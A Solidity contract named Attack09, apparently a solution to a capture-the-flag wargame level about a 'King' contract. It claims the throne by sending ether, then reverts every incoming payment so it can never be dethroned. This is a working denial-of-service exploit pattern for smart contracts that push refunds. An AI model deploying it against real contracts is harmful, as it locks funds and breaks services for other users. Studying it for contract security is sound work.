// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Attack09 {
    // constructor sets the address of the King contract to attack
    constructor(address _kingAddress) public payable {
        // upon deployment send msg.value to the King contract to
        // become the new King
        // msg.value needs to be >= prize + 1 wei
        address(_kingAddress).call{value: msg.value}("");
    }

    // at this point you are the King already
    // King contract attempts to take back control, but we revert!
    receive() external payable {
        revert("I am the King for all eternity!");
    }
}
